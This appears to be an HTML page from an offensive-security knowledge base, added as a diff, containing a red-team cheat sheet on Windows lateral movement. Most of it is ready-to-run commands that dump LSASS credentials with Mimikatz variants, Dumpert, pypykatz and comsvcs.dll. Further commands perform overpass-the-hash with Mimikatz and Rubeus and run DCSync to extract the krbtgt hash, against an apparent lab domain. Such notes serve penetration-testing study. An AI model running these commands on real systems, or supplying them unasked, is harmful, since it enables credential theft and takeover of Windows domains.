@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <title>offsecvault - Knowledge Base</title>
+  <!--------------------->
+  <!-- b0ydC owned. -->
+  <!-- --------------- -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8" />
+
+  <style>
+    body {
+      font-size: 12px;
+      font-family: ubuntu mono;
+      background-color: white;
+      color: black;
+      margin: 0;
+    }
+
+    a {
+      color: black;
+      font-weight: bold;
+      text-decoration: none;
+    }
+
+    a:hover,
+    a:active {
+      color: #868686;
+      text-decoration: underline;
+    }
+    table, th, td {
+    border: 1px solid black;
+    border-collapse: collapse;
+    }
+
+    table.center {
+    margin-left: auto; 
+    margin-right: auto;
+}
+    
+  </style>
+</head>
+
+<body>
+  <pre><center>
+<a href="/index.html" style="text-decoration:none;">
+ ▒█████    █████▒ █████▒ ██████ ▓█████  ▄████▄ ██▒   █▓ ▄▄▄       █    ██  ██▓  ▄▄▄█████▓
+▒██▒  ██▒▓██   ▒▓██   ▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█▓██░   █▒▒████▄     ██  ▓██▒▓██▒  ▓  ██▒ ▓▒
+▒██░  ██▒▒████ ░▒████ ░░ ▓██▄   ▒███   ▒▓█    ▄▓██  █▒░▒██  ▀█▄  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░
+▒██   ██░░▓█▒  ░░▓█▒  ░  ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒▒██ █░░░██▄▄▄▄██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ 
+░ ████▓▒░░▒█░   ░▒█░   ▒██████▒▒░▒████▒▒ ▓███▀ ░ ▒▀█░   ▓█   ▓██▒▒▒█████▓ ░██████▒▒██▒ ░ 
+░ ▒░▒░▒░  ▒ ░    ▒ ░   ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░ ░ ▐░   ▒▒   ▓▒█░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   
+  ░ ▒ ▒░  ░      ░     ░ ░▒  ░ ░ ░ ░  ░  ░  ▒    ░ ░░    ▒   ▒▒ ░░░▒░ ░ ░ ░ ░ ▒  ░  ░    
+░ ░ ░ ▒   ░ ░    ░ ░   ░  ░  ░     ░   ░           ░░    ░   ▒    ░░░ ░ ░   ░ ░   ░      
+    ░ ░                      ░     ░  ░░ ░          ░        ░  ░   ░         ░  ░       
+                                       ░           ░                                     
+</a></pre>
+
+<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
+    <a href="../../RED-TEAM.html">OFFENSIVE</a> |
+    <a href="../../BLUE-TEAM.html">DEFENSIVE</a> |
+    <a href="../../CTF.html">CTF</a> |
+    <a href="../../TOOLS.html">TOOLS</a> |
+    <a href="../../ABOUT.html">ABOUT</a> 
+</div>
+<pre style="text-align:center;">
+<h3>LATERAL MOVEMENT - MIMIKATZ</h3>
+
+>> invoke-mimikatz
+
+"Invoke-Mimikatz" is a powershell script, using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the
+memory. all functions of mimikatz could be used from this script. (script needs rights to dump credentials)
+
+>>> EXTRACTING CREDENTIALS FROM LSASS
+
+<b>::: DUMP CREDENTIALS ON A LOCAL MACHINE USING MIMIKATZ</b>
+
+PS> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+
+<b>::: USING SAFETYKATZ (minidump of LSASS and PELoader to run Mimikatz)</b>
+
+PS> SafetyKatz.exe "sekurlsa::ekeys"
+
+<b>::: DUMP CREDENTIALS USING SHARPKATZ (C# port of some of mimikatz functions</b>
+
+PS> SharpKatz.exe --Command ekeys
+
+<b>::: DUMP CREDENTIALS USING DUMPERT (Direct System Calls and API unhooking)</b>
+
+PS> rundll32.exe C:\Dumpert\Outflank-Dumpert.dll, Dump
+
+<b>::: USING PYPYKATZ (mimikatz functionanlity in Python)</b>
+
+PS> pypykatz.exe live lsa
+
+<b>::: USING comsvcs.dll</b>
+
+PS> tasklist /FI "IMAGENAME eq lsass.exe"
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
+
+>>> OVERPASS-THE-HASH (OPTH)
+
+"generate tokens from hashes or keys" - (needs admin rights)
+
+PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:[aes256key] /run:powershell.exe"'
+
+PS> Safetykatz.exe '"sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:[aes256key] /run:cmd.exe" "exit"
+
+NOTE: those will generate a powershell session with logon type 9 (same  as runas /netonly)
+
+NOTE: using Rubeus.exe the following command doesn't need elevation
+
+PS> Rubeus.exe asktgt /user:administrator /rc4:[ntlmhash] /ptt
+
+instead, the following needs rights
+
+PS> Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+
+>>> DCSync
+
+"extract credentials from the DC without code execution on it"
+
+<b>::: DCSync FEATURE FOR GETTING KRBTGTHASH</b>
+
+NOTE: Domain Admins privileges are required to run DCSync
+
+PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+
+PS> SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
+
+</center>
+</body>
+</html>
